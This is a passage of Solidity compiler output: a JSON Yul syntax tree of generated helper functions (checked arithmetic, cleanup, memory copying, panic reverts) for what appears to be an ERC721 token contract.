{"name":"length","nodeType":"YulTypedName","src":"18745:6:15","type":""}],"src":"18694:98:15"},{"body":{"nodeType":"YulBlock","src":"18857:40:15","statements":[{"nodeType":"YulAssignment","src":"18868:22:15","value":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"18884:5:15"}],"functionName":{"name":"mload","nodeType":"YulIdentifier","src":"18878:5:15"},"nodeType":"YulFunctionCall","src":"18878:12:15"},"variableNames":[{"name":"length","nodeType":"YulIdentifier","src":"18868:6:15"}]}]},"name":"array_length_t_string_memory_ptr","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"18840:5:15","type":""}],"returnVariables":[{"name":"length","nodeType":"YulTypedName","src":"18850:6:15","type":""}],"src":"18798:99:15"},{"body":{"nodeType":"YulBlock","src":"18998:73:15","statements":[{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"19015:3:15"},{"name":"length","nodeType":"YulIdentifier","src":"19020:6:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"19008:6:15"},"nodeType":"YulFunctionCall","src":"19008:19:15"},"nodeType":"YulExpressionStatement","src":"19008:19:15"},{"nodeType":"YulAssignment","src":"19036:29:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"19055:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"19060:4:15","type":"","value":"0x20"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"19051:3:15"},"nodeType":"YulFunctionCall","src":"19051:14:15"},"variableNames":[{"name":"updated_pos","nodeType":"YulIdentifier","src":"19036:11:15"}]}]},"name":"array_storeLengthForEncoding_t_bytes_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"18970:3:15","type":""},{"name":"length","nodeType":"YulTypedName","src":"18975:6:15","type":""}],"returnVariables":[{"name":"updated_pos","nodeType":"YulTypedName","src":"18986:11:15","type":""}],"src":"18903:168:15"},{"body":{"nodeType":"YulBlock","src":"19173:73:15","statements":[{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"19190:3:15"},{"name":"length","nodeType":"YulIdentifier","src":"19195:6:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"19183:6:15"},"nodeType":"YulFunctionCall","src":"19183:19:15"},"nodeType":"YulExpressionStatement","src":"19183:19:15"},{"nodeType":"YulAssignment","src":"19211:29:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"19230:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"19235:4:15","type":"","value":"0x20"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"19226:3:15"},"nodeType":"YulFunctionCall","src":"19226:14:15"},"variableNames":[{"name":"updated_pos","nodeType":"YulIdentifier","src":"19211:11:15"}]}]},"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"19145:3:15","type":""},{"name":"length","nodeType":"YulTypedName","src":"19150:6:15","type":""}],"returnVariables":[{"name":"updated_pos","nodeType":"YulTypedName","src":"19161:11:15","type":""}],"src":"19077:169:15"},{"body":{"nodeType":"YulBlock","src":"19296:261:15","statements":[{"nodeType":"YulAssignment","src":"19306:25:15","value":{"arguments":[{"name":"x","nodeType":"YulIdentifier","src":"19329:1:15"}],"functionName":{"name":"cleanup_t_uint256","nodeType":"YulIdentifier","src":"19311:17:15"},"nodeType":"YulFunctionCall","src":"19311:20:15"},"variableNames":[{"name":"x","nodeType":"YulIdentifier","src":"19306:1:15"}]},{"nodeType":"YulAssignment","src":"19340:25:15","value":{"arguments":[{"name":"y","nodeType":"YulIdentifier","src":"19363:1:15"}],"functionName":{"name":"cleanup_t_uint256","nodeType":"YulIdentifier","src":"19345:17:15"},"nodeType":"YulFunctionCall","src":"19345:20:15"},"variableNames":[{"name":"y","nodeType":"YulIdentifier","src":"19340:1:15"}]},{"body":{"nodeType":"YulBlock","src":"19503:22:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"panic_error_0x11","nodeType":"YulIdentifier","src":"19505:16:15"},"nodeType":"YulFunctionCall","src":"19505:18:15"},"nodeType":"YulExpressionStatement","src":"19505:18:15"}]},"condition":{"arguments":[{"name":"x","nodeType":"YulIdentifier","src":"19424:1:15"},{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"19431:66:15","type":"","value":"0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"},{"name":"y","nodeType":"YulIdentifier","src":"19499:1:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"19427:3:15"},"nodeType":"YulFunctionCall","src":"19427:74:15"}],"functionName":{"name":"gt","nodeType":"YulIdentifier","src":"19421:2:15"},"nodeType":"YulFunctionCall","src":"19421:81:15"},"nodeType":"YulIf","src":"19418:107:15"},{"nodeType":"YulAssignment","src":"19535:16:15","value":{"arguments":[{"name":"x","nodeType":"YulIdentifier","src":"19546:1:15"},{"name":"y","nodeType":"YulIdentifier","src":"19549:1:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"19542:3:15"},"nodeType":"YulFunctionCall","src":"19542:9:15"},"variableNames":[{"name":"sum","nodeType":"YulIdentifier","src":"19535:3:15"}]}]},"name":"checked_add_t_uint256","nodeType":"YulFunctionDefinition","parameters":[{"name":"x","nodeType":"YulTypedName","src":"19283:1:15","type":""},{"name":"y","nodeType":"YulTypedName","src":"19286:1:15","type":""}],"returnVariables":[{"name":"sum","nodeType":"YulTypedName","src":"19292:3:15","type":""}],"src":"19252:305:15"},{"body":{"nodeType":"YulBlock","src":"19608:146:15","statements":[{"nodeType":"YulAssignment","src":"19618:25:15","value":{"arguments":[{"name":"x","nodeType":"YulIdentifier","src":"19641:1:15"}],"functionName":{"name":"cleanup_t_uint256","nodeType":"YulIdentifier","src":"19623:17:15"},"nodeType":"YulFunctionCall","src":"19623:20:15"},"variableNames":[{"name":"x","nodeType":"YulIdentifier","src":"19618:1:15"}]},{"nodeType":"YulAssignment","src":"19652:25:15","value":{"arguments":[{"name":"y","nodeType":"YulIdentifier","src":"19675:1:15"}],"functionName":{"name":"cleanup_t_uint256","nodeType":"YulIdentifier","src":"19657:17:15"},"nodeType":"YulFunctionCall","src":"19657:20:15"},"variableNames":[{"name":"y","nodeType":"YulIdentifier","src":"19652:1:15"}]},{"body":{"nodeType":"YulBlock","src":"19699:22:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"panic_error_0x11","nodeType":"YulIdentifier","src":"19701:16:15"},"nodeType":"YulFunctionCall","src":"19701:18:15"},"nodeType":"YulExpressionStatement","src":"19701:18:15"}]},"condition":{"arguments":[{"name":"x","nodeType":"YulIdentifier","src":"19693:1:15"},{"name":"y","nodeType":"YulIdentifier","src":"19696:1:15"}],"functionName":{"name":"lt","nodeType":"YulIdentifier","src":"19690:2:15"},"nodeType":"YulFunctionCall","src":"19690:8:15"},"nodeType":"YulIf","src":"19687:34:15"},{"nodeType":"YulAssignment","src":"19731:17:15","value":{"arguments":[{"name":"x","nodeType":"YulIdentifier","src":"19743:1:15"},{"name":"y","nodeType":"YulIdentifier","src":"19746:1:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"19739:3:15"},"nodeType":"YulFunctionCall","src":"19739:9:15"},"variableNames":[{"name":"diff","nodeType":"YulIdentifier","src":"19731:4:15"}]}]},"name":"checked_sub_t_uint256","nodeType":"YulFunctionDefinition","parameters":[{"name":"x","nodeType":"YulTypedName","src":"19594:1:15","type":""},{"name":"y","nodeType":"YulTypedName","src":"19597:1:15","type":""}],"returnVariables":[{"name":"diff","nodeType":"YulTypedName","src":"19603:4:15","type":""}],"src":"19563:191:15"},{"body":{"nodeType":"YulBlock","src":"19805:51:15","statements":[{"nodeType":"YulAssignment","src":"19815:35:15","value":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"19844:5:15"}],"functionName":{"name":"cleanup_t_uint160","nodeType":"YulIdentifier","src":"19826:17:15"},"nodeType":"YulFunctionCall","src":"19826:24:15"},"variableNames":[{"name":"cleaned","nodeType":"YulIdentifier","src":"19815:7:15"}]}]},"name":"cleanup_t_address","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"19787:5:15","type":""}],"returnVariables":[{"name":"cleaned","nodeType":"YulTypedName","src":"19797:7:15","type":""}],"src":"19760:96:15"},{"body":{"nodeType":"YulBlock","src":"19904:48:15","statements":[{"nodeType":"YulAssignment","src":"19914:32:15","value":{"arguments":[{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"19939:5:15"}],"functionName":{"name":"iszero","nodeType":"YulIdentifier","src":"19932:6:15"},"nodeType":"YulFunctionCall","src":"19932:13:15"}],"functionName":{"name":"iszero","nodeType":"YulIdentifier","src":"19925:6:15"},"nodeType":"YulFunctionCall","src":"19925:21:15"},"variableNames":[{"name":"cleaned","nodeType":"YulIdentifier","src":"19914:7:15"}]}]},"name":"cleanup_t_bool","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"19886:5:15","type":""}],"returnVariables":[{"name":"cleaned","nodeType":"YulTypedName","src":"19896:7:15","type":""}],"src":"19862:90:15"},{"body":{"nodeType":"YulBlock","src":"20002:105:15","statements":[{"nodeType":"YulAssignment","src":"20012:89:15","value":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"20027:5:15"},{"kind":"number","nodeType":"YulLiteral","src":"20034:66:15","type":"","value":"0xffffffff00000000000000000000000000000000000000000000000000000000"}],"functionName":{"name":"and","nodeType":"YulIdentifier","src":"20023:3:15"},"nodeType":"YulFunctionCall","src":"20023:78:15"},"variableNames":[{"name":"cleaned","nodeType":"YulIdentifier","src":"20012:7:15"}]}]},"name":"cleanup_t_bytes4","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"19984:5:15","type":""}],"returnVariables":[{"name":"cleaned","nodeType":"YulTypedName","src":"19994:7:15","type":""}],"src":"19958:149:15"},{"body":{"nodeType":"YulBlock","src":"20158:81:15","statements":[{"nodeType":"YulAssignment","src":"20168:65:15","value":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"20183:5:15"},{"kind":"number","nodeType":"YulLiteral","src":"20190:42:15","type":"","value":"0xffffffffffffffffffffffffffffffffffffffff"}],"functionName":{"name":"and","nodeType":"YulIdentifier","src":"20179:3:15"},"nodeType":"YulFunctionCall","src":"20179:54:15"},"variableNames":[{"name":"cleaned","nodeType":"YulIdentifier","src":"20168:7:15"}]}]},"name":"cleanup_t_uint160","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"20140:5:15","type":""}],"returnVariables":[{"name":"cleaned","nodeType":"YulTypedName","src":"20150:7:15","type":""}],"src":"20113:126:15"},{"body":{"nodeType":"YulBlock","src":"20290:32:15","statements":[{"nodeType":"YulAssignment","src":"20300:16:15","value":{"name":"value","nodeType":"YulIdentifier","src":"20311:5:15"},"variableNames":[{"name":"cleaned","nodeType":"YulIdentifier","src":"20300:7:15"}]}]},"name":"cleanup_t_uint256","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"20272:5:15","type":""}],"returnVariables":[{"name":"cleaned","nodeType":"YulTypedName","src":"20282:7:15","type":""}],"src":"20245:77:15"},{"body":{"nodeType":"YulBlock","src":"20379:103:15","statements":[{"expression":{"arguments":[{"name":"dst","nodeType":"YulIdentifier","src":"20402:3:15"},{"name":"src","nodeType":"YulIdentifier","src":"20407:3:15"},{"name":"length","nodeType":"YulIdentifier","src":"20412:6:15"}],"functionName":{"name":"calldatacopy","nodeType":"YulIdentifier","src":"20389:12:15"},"nodeType":"YulFunctionCall","src":"20389:30:15"},"nodeType":"YulExpressionStatement","src":"20389:30:15"},{"expression":{"arguments":[{"arguments":[{"name":"dst","nodeType":"YulIdentifier","src":"20460:3:15"},{"name":"length","nodeType":"YulIdentifier","src":"20465:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"20456:3:15"},"nodeType":"YulFunctionCall","src":"20456:16:15"},{"kind":"number","nodeType":"YulLiteral","src":"20474:1:15","type":"","value":"0"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"20449:6:15"},"nodeType":"YulFunctionCall","src":"20449:27:15"},"nodeType":"YulExpressionStatement","src":"20449:27:15"}]},"name":"copy_calldata_to_memory","nodeType":"YulFunctionDefinition","parameters":[{"name":"src","nodeType":"YulTypedName","src":"20361:3:15","type":""},{"name":"dst","nodeType":"YulTypedName","src":"20366:3:15","type":""},{"name":"length","nodeType":"YulTypedName","src":"20371:6:15","type":""}],"src":"20328:154:15"},{"body":{"nodeType":"YulBlock","src":"20537:258:15","statements":[{"nodeType":"YulVariableDeclaration","src":"20547:10:15","value":{"kind":"number","nodeType":"YulLiteral","src":"20556:1:15","type":"","value":"0"},"variables":[{"name":"i","nodeType":"YulTypedName","src":"20551:1:15","type":""}]},{"body":{"nodeType":"YulBlock","src":"20616:63:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"dst","nodeType":"YulIdentifier","src":"20641:3:15"},{"name":"i","nodeType":"YulIdentifier","src":"20646:1:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"20637:3:15"},"nodeType":"YulFunctionCall","src":"20637:11:15"},{"arguments":[{"arguments":[{"name":"src","nodeType":"YulIdentifier","src":"20660:3:15"},{"name":"i","nodeType":"YulIdentifier","src":"20665:1:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"20656:3:15"},"nodeType":"YulFunctionCall","src":"20656:11:15"}],"functionName":{"name":"mload","nodeType":"YulIdentifier","src":"20650:5:15"},"nodeType":"YulFunctionCall","src":"20650:18:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"20630:6:15"},"nodeType":"YulFunctionCall","src":"20630:39:15"},"nodeType":"YulExpressionStatement","src":"20630:39:15"}]},"condition":{"arguments":[{"name":"i","nodeType":"YulIdentifier","src":"20577:1:15"},{"name":"length","nodeType":"YulIdentifier","src":"20580:6:15"}],"functionName":{"name":"lt","nodeType":"YulIdentifier","src":"20574:2:15"},"nodeType":"YulFunctionCall","src":"20574:13:15"},"nodeType":"YulForLoop","post":{"nodeType":"YulBlock","src":"20588:19:15","statements":[{"nodeType":"YulAssignment","src":"20590:15:15","value":{"arguments":[{"name":"i","nodeType":"YulIdentifier","src":"20599:1:15"},{"kind":"number","nodeType":"YulLiteral","src":"20602:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"20595:3:15"},"nodeType":"YulFunctionCall","src":"20595:10:15"},"variableNames":[{"name":"i","nodeType":"YulIdentifier","src":"20590:1:15"}]}]},"pre":{"nodeType":"YulBlock","src":"20570:3:15","statements":[]},"src":"20566:113:15"},{"body":{"nodeType":"YulBlock","src":"20713:76:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"dst","nodeType":"YulIdentifier","src":"20763:3:15"},{"name":"length","nodeType":"YulIdentifier","src":"20768:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"20759:3:15"},"nodeType":"YulFunctionCall","src":"20759:16:15"},{"kind":"number","nodeType":"YulLiteral","src":"20777:1:15","type":"","value":"0"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"20752:6:15"},"nodeType":"YulFunctionCall","src":"20752:27:15"},"nodeType":"YulExpressionStatement","src":"20752:27:15"}]},"condition":{"arguments":[{"name":"i","nodeType":"YulIdentifier","src":"20694:1:15"},{"name":"length","nodeType":"YulIdentifier","src":"20697:6:15"}],"functionName":{"name":"gt","nodeType":"YulIdentifier","src":"20691:2:15"},"nodeType":"YulFunctionCall","src":"20691:13:15"},"nodeType":"YulIf","src":"20688:101:15"}]},"name":"copy_memory_to_memory","nodeType":"YulFunctionDefinition","parameters":[{"name":"src","nodeType":"YulTypedName","src":"20519:3:15","type":""},{"name":"dst","nodeType":"YulTypedName","src":"20524:3:15","type":""},{"name":"length","nodeType":"YulTypedName","src":"20529:6:15","type":""}],"src":"20488:307:15"},{"body":{"nodeType":"YulBlock","src":"20852:269:15","statements":[{"nodeType":"YulAssignment","src":"20862:22:15","value":{"arguments":[{"name":"data","nodeType":"YulIdentifier","src":"20876:4:15"},{"kind":"number","nodeType":"YulLiteral","src":"20882:1:15","type":"","value":"2"}],"functionName":{"name":"div","nodeType":"YulIdentifier","src":"20872:3:15"},"nodeType":"YulFunctionCall","src":"20872:12:15"},"variableNames":[{"name":"length","nodeType":"YulIdentifier","src":"20862:6:15"}]},{"nodeType":"YulVariableDeclaration","src":"20893:38:15","value":{"arguments":[{"name":"data","nodeType":"YulIdentifier","src":"20923:4:15"},{"kind":"number","nodeType":"YulLiteral","src":"20929:1:15","type":"","value":"1"}],"functionName":{"name":"and","nodeType":"YulIdentifier","src":"20919:3:15"},"nodeType":"YulFunctionCall","src":"20919:12:15"},"variables":[{"name":"outOfPlaceEncoding","nodeType":"YulTypedName","src":"20897:18:15","type":""}]},{"body":{"nodeType":"YulBlock","src":"20970:51:15","statements":[{"nodeType":"YulAssignment","src":"20984:27:15","value":{"arguments":[{"name":"length","nodeType":"YulIdentifier","src":"20998:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"21006:4:15","type":"","value":"0x7f"}],"functionName":{"name":"and","nodeType":"YulIdentifier","src":"20994:3:15"},"nodeType":"YulFunctionCall","src":"20994:17:15"},"variableNames":[{"name":"length","nodeType":"YulIdentifier","src":"20984:6:15"}]}]},"condition":{"arguments":[{"name":"outOfPlaceEncoding","nodeType":"YulIdentifier","src":"20950:18:15"}],"functionName":{"name":"iszero","nodeType":"YulIdentifier","src":"20943:6:15"},"nodeType":"YulFunctionCall","src":"20943:26:15"},"nodeType":"YulIf","src":"20940:81:15"},{"body":{"nodeType":"YulBlock","src":"21073:42:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"panic_error_0x22","nodeType":"YulIdentifier","src":"21087:16:15"},"nodeType":"YulFunctionCall","src":"21087:18:15"},"nodeType":"YulExpressionStatement","src":"21087:18:15"}]},"condition":{"arguments":[{"name":"outOfPlaceEncoding","nodeType":"YulIdentifier","src":"21037:18:15"},{"arguments":[{"name":"length","nodeType":"YulIdentifier","src":"21060:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"21068:2:15","type":"","value":"32"}],"functionName":{"name":"lt","nodeType":"YulIdentifier","src":"21057:2:15"},"nodeType":"YulFunctionCall","src":"21057:14:15"}],"functionName":{"name":"eq","nodeType":"YulIdentifier","src":"21034:2:15"},"nodeType":"YulFunctionCall","src":"21034:38:15"},"nodeType":"YulIf","src":"21031:84:15"}]},"name":"extract_byte_array_length","nodeType":"YulFunctionDefinition","parameters":[{"name":"data","nodeType":"YulTypedName","src":"20836:4:15","type":""}],"returnVariables":[{"name":"length","nodeType":"YulTypedName","src":"20845:6:15","type":""}],"src":"20801:320:15"},{"body":{"nodeType":"YulBlock","src":"21170:238:15","statements":[{"nodeType":"YulVariableDeclaration","src":"21180:58:15","value":{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"21202:6:15"},{"arguments":[{"name":"size","nodeType":"YulIdentifier","src":"21232:4:15"}],"functionName":{"name":"round_up_to_mul_of_32","nodeType":"YulIdentifier","src":"21210:21:15"},"nodeType":"YulFunctionCall","src":"21210:27:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"21198:3:15"},"nodeType":"YulFunctionCall","src":"21198:40:15"},"variables":[{"name":"newFreePtr","nodeType":"YulTypedName","src":"21184:10:15","type":""}]},{"body":{"nodeType":"YulBlock","src":"21349:22:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"panic_error_0x41","nodeType":"YulIdentifier","src":"21351:16:15"},"nodeType":"YulFunctionCall","src":"21351:18:15"},"nodeType":"YulExpressionStatement","src":"21351:18:15"}]},"condition":{"arguments":[{"arguments":[{"name":"newFreePtr","nodeType":"YulIdentifier","src":"21292:10:15"},{"kind":"number","nodeType":"YulLiteral","src":"21304:18:15","type":"","value":"0xffffffffffffffff"}],"functionName":{"name":"gt","nodeType":"YulIdentifier","src":"21289:2:15"},"nodeType":"YulFunctionCall","src":"21289:34:15"},{"arguments":[{"name":"newFreePtr","nodeType":"YulIdentifier","src":"21328:10:15"},{"name":"memPtr","nodeType":"YulIdentifier","src":"21340:6:15"}],"functionName":{"name":"lt","nodeType":"YulIdentifier","src":"21325:2:15"},"nodeType":"YulFunctionCall","src":"21325:22:15"}],"functionName":{"name":"or","nodeType":"YulIdentifier","src":"21286:2:15"},"nodeType":"YulFunctionCall","src":"21286:62:15"},"nodeType":"YulIf","src":"21283:88:15"},{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"21387:2:15","type":"","value":"64"},{"name":"newFreePtr","nodeType":"YulIdentifier","src":"21391:10:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"21380:6:15"},"nodeType":"YulFunctionCall","src":"21380:22:15"},"nodeType":"YulExpressionStatement","src":"21380:22:15"}]},"name":"finalize_allocation","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nodeType":"YulTypedName","src":"21156:6:15","type":""},{"name":"size","nodeType":"YulTypedName","src":"21164:4:15","type":""}],"src":"21127:281:15"},{"body":{"nodeType":"YulBlock","src":"21442:152:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"21459:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"21462:77:15","type":"","value":"35408467139433450592217433187231851964531694900788300625387963629091585785856"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"21452:6:15"},"nodeType":"YulFunctionCall","src":"21452:88:15"},"nodeType":"YulExpressionStatement","src":"21452:88:15"},{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"21556:1:15","type":"","value":"4"},{"kind":"number","nodeType":"YulLiteral","src":"21559:4:15","type":"","value":"0x11"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"21549:6:15"},"nodeType":"YulFunctionCall","src":"21549:15:15"},"nodeType":"YulExpressionStatement","src":"21549:15:15"},{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"21580:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"21583:4:15","type":"","value":"0x24"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"21573:6:15"},"nodeType":"YulFunctionCall","src":"21573:15:15"},"nodeType":"YulExpressionStatement","src":"21573:15:15"}]},"name":"panic_error_0x11","nodeType":"YulFunctionDefinition","src":"21414:180:15"},{"body":{"nodeType":"YulBlock","src":"21628:152:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"21645:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"21648:77:15","type":"","value":"35408467139433450592217433187231851964531694900788300625387963629091585785856"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"21638:6:15"},"nodeType":"YulFunctionCall","src":"21638:88:15"},"nodeType":"YulExpressionStatement","src":"21638:88:15"},{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"21742:1:15","type":"","value":"4"},{"kind":"number","nodeType":"YulLiteral","src":"21745:4:15","type":"","value":"0x22"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"21735:6:15"},"nodeType":"YulFunctionCall","src":"21735:15:15"},"nodeType":"YulExpressionStatement","src":"21735:15:15"},{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"21766:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"21769:4:15","type":"","value":"0x24"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"21759:6:15"},"nodeType":"YulFunctionCall","src":"21759:15:15"},"nodeType":"YulExpressionStatement","src":"21759:15:15"}]},"name":"panic_error_0x22","nodeType":"YulFunctionDefinition","src":"21600:180:15"},{"body":{"nodeType":"YulBlock","src":"21814:152:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"21831:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"21834:77:15","type":"","value":"35408467139433450592217433187231851964531694900788300625387963629091585785856"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"21824:6:15"},"nodeType":"YulFunctionCall","src":"21824:88:15"},"nodeType":"YulExpressionStatement","src":"21824:88:15"},{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"21928:1:15","type":"","value":"4"},{"kind":"number","nodeType":"YulLiteral","src":"21931:4:15","type":"","value":"0x41"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"21921:6:15"},"nodeType":"YulFunctionCall","src":"21921:15:15"},"nodeType":"YulExpressionStatement","src":"21921:15:15"},{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"21952:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"21955:4:15","type":"","value":"0x24"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"21945:6:15"},"nodeType":"YulFunctionCall","src":"21945:15:15"},"nodeType":"YulExpressionStatement","src":"21945:15:15"}]},"name":"panic_error_0x41","nodeType":"YulFunctionDefinition","src":"21786:180:15"},{"body":{"nodeType":"YulBlock","src":"22061:28:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"22078:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"22081:1:15","type":"","value":"0"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"22071:6:15"},"nodeType":"YulFunctionCall","src":"22071:12:15"},"nodeType":"YulExpressionStatement","src":"22071:12:15"}]},"name":"revert_error_1b9f4a0a5773e33b91aa01db23bf8c55fce1411167c872835e7fa00a4f17d46d","nodeType":"YulFunctionDefinition","src":"21972:117:15"},{"body":{"nodeType":"YulBlock","src":"22184:28:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"22201:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"22204:1:15","type":"","value":"0"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"22194:6:15"},"nodeType":"YulFunctionCall","src":"22194:12:15"},"nodeType":"YulExpressionStatement","src":"22194:12:15"}]},"name":"revert_error_987264b3b1d58a9c7f8255e93e81c77d86d6299019c33110a076957a3e06e2ae","nodeType":"YulFunctionDefinition","src":"22095:117:15"},{"body":{"nodeType":"YulBlock","src":"22307:28:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"22324:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"22327:1:15","type":"","value":"0"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"22317:6:15"},"nodeType":"YulFunctionCall","src":"22317:12:15"},"nodeType":"YulExpressionStatement","src":"22317:12:15"}]},"name":"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db","nodeType":"YulFunctionDefinition","src":"22218:117:15"},{"body":{"nodeType":"YulBlock","src":"22430:28:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"22447:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"22450:1:15","type":"","value":"0"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"22440:6:15"},"nodeType":"YulFunctionCall","src":"22440:12:15"},"nodeType":"YulExpressionStatement","src":"22440:12:15"}]},"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nodeType":"YulFunctionDefinition","src":"22341:117:15"},{"body":{"nodeType":"YulBlock","src":"22512:54:15","statements":[{"nodeType":"YulAssignment","src":"22522:38:15","value":{"arguments":[{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"22540:5:15"},{"kind":"number","nodeType":"YulLiteral","src":"22547:2:15","type":"","value":"31"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"22536:3:15"},"nodeType":"YulFunctionCall","src":"22536:14:15"},{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"22556:2:15","type":"","value":"31"}],"functionName":{"name":"not","nodeType":"YulIdentifier","src":"22552:3:15"},"nodeType":"YulFunctionCall","src":"22552:7:15"}],"functionName":{"name":"and","nodeType":"YulIdentifier","src":"22532:3:15"},"nodeType":"YulFunctionCall","src":"22532:28:15"},"variableNames":[{"name":"result","nodeType":"YulIdentifier","src":"22522:6:15"}]}]},"name":"round_up_to_mul_of_32","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"22495:5:15","type":""}],"returnVariables":[{"name":"result","nodeType":"YulTypedName","src":"22505:6:15","type":""}],"src":"22464:102:15"},{"body":{"nodeType":"YulBlock","src":"22678:126:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"22700:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"22708:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"22696:3:15"},"nodeType":"YulFunctionCall","src":"22696:14:15"},{"hexValue":"4552433732313a2063616c6c6572206973206e6f7420746f6b656e206f776e65","kind":"string","nodeType":"YulLiteral","src":"22712:34:15","type":"","value":"ERC721: caller is not token 